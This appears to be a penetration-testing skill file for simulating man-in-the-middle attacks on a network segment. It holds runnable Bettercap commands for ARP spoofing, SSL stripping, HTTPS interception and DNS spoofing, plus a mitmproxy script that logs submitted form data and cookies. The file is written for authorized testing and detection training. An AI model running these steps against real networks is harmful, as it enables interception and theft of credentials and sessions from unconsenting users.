---
name: conducting-man-in-the-middle-attack-simulation
description: "Simulates man-in-the-middle attacks using Ettercap, mitmproxy, and Bettercap 信号:中间人,mitm,嗅探。"
when-to-use: 'Simulates man-in-the-middle attacks using Ettercap, mitmproxy, and Bettercap
  in authorized environments to intercept, analyze, and modify network traffic for
  testing encryption enforcement, certificate validation, and detection capabilities.

  '
domain: cybersecurity
subdomain: network-security
tags:
- network-security
- mitm
- bettercap
- ettercap
- mitmproxy
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
mitre_attack:
- T1557.001
- T1557.002
- T1040
---
# Conducting Man-in-the-Middle Attack Simulation

## When to Use

- Testing whether applications properly validate TLS certificates and enforce encrypted communications
- Demonstrating the risk of cleartext protocols (HTTP, FTP, Telnet, SMTP) to organization stakeholders
- Validating that HSTS, certificate pinning, and other anti-MITM controls are correctly implemented
- Assessing network detection capabilities for ARP spoofing, DHCP spoofing, and DNS spoofing attacks
- Training incident response teams to identify and respond to MITM attack indicators

**Do not use** on production networks without explicit written authorization and a rollback plan, against systems you do not own or have permission to test, or for intercepting communications of uninvolved third parties.

## Prerequisites

- Written authorization specifying in-scope targets and approved MITM techniques
- Bettercap 2.x, Ettercap, and mitmproxy installed on the attacker machine
- Layer 2 access to the same network segment as target hosts
- Custom CA certificate for TLS interception testing (generated specifically for the engagement)
- Wireshark or tshark for capturing and verifying intercepted traffic
- Isolated lab environment or approved production test window with rollback procedures

## Workflow

### Step 1: Set Up the Attack Environment

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Disable ICMP redirects
sudo sysctl -w net.ipv4.conf.all.send_redirects=0

# Generate a CA certificate for TLS interception
openssl genrsa -out mitm-ca.key 4096
openssl req -new -x509 -days 30 -key mitm-ca.key -out mitm-ca.crt \
  -subj "/CN=MITM Test CA/O=Security Assessment/C=US"

# Discover hosts on the target network
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; quit"
```

### Step 2: Execute ARP-Based MITM with Bettercap

```bash
# Start Bettercap with interactive mode
sudo bettercap -iface eth0

# Enable network probing to discover hosts
> net.probe on

# Display discovered hosts
> net.show

# Set target (victim: 192.168.1.50, gateway: 192.168.1.1)
> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true

# Start ARP spoofing
> arp.spoof on

# Enable HTTP proxy for traffic inspection
> set http.proxy.sslstrip true
> http.proxy on

# Enable HTTPS proxy with certificate interception
> set https.proxy.certificate mitm-ca.crt
> set https.proxy.key mitm-ca.key
> https.proxy on

# Enable DNS spoofing for specific domains
> set dns.spoof.domains example.com,*.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on

# Enable credential sniffer
> set net.sniff.verbose true
> set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 110"
> net.sniff on
```

### Step 3: Intercept HTTP/HTTPS Traffic with mitmproxy

```bash
# Start mitmproxy as transparent proxy
sudo mitmproxy --mode transparent --set confdir=~/.mitmproxy \
  --set ssl_insecure=true -w mitm_capture.flow

# Configure iptables to redirect traffic through mitmproxy
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Use mitmproxy scripting for automated credential extraction
cat > extract_creds.py << 'PYEOF'
"""mitmproxy script to extract credentials from intercepted traffic."""
from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    if flow.request.method == "POST":
        content_type = flow.request.headers.get("content-type", "")
        if "form" in content_type or "json" in content_type:
            with open("captured_forms.log", "a") as f:
                f.write(f"URL: {flow.request.pretty_url}\n")
                f.write(f"Data: {flow.request.get_text()}\n")
                f.write("---\n")

def response(flow: http.HTTPFlow):
    # Log authentication cookies
    if "set-cookie" in flow.response.headers:
        with open("captured_cookies.log", "a") as f:
            f.write(f"URL: {flow.request.pretty_url}\n")
            f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
            f.write("---\n")
PYEOF

sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
